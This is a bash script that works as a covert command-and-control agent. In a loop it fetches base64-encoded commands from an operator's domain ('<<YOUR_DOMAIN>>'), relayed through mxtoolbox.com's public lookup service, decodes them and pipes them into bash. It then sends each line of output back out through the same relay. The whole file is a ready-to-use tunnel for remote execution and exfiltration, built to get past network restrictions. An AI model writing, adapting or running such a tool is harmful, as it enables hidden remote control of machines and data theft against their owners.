#!/bin/bash

while true; do
  # NOTE: Execute commands from a restricted server on the Internet.
  results=$(
    curl 'https://mxtoolbox.com/Public/Lookup.aspx/DoLookup2'\
    -s\
    -H 'Content-Type: application/json; charset=utf-8'\
    --data '{"inputText":"http://<<YOUR_DOMAIN>>?action=execute_command","resultIndex":2}'\
    -s\
      | grep -oP 'table-column-ContentType.*?\\\\u003c'\
      | sed 's/table-column-ContentType\\\\u0027\\\\u003e//;s/\\\\u003c//'\
      | base64 -d\
      | bash
  )

  # NOTE: Send data to a restricted server on the Internet.
  while read -r line; do
    b64_encoded_line=$(base64 <<<"$line" | tr -d '\n')
    curl 'https://mxtoolbox.com/Public/Lookup.aspx/DoLookup2'\
      -s\
      -H 'Content-Type: application/json; charset=utf-8'\
      --data "{\"inputText\":\"http://<<YOUR_DOMAIN>>?action=send_output&data=$b64_encoded_line\",\"resultIndex\":2}"\
      -o /dev/null
    sleep 2
  done <<<"$results"

  # NOTE: Poll the server every 60 seconds for updates.
  sleep 60
done
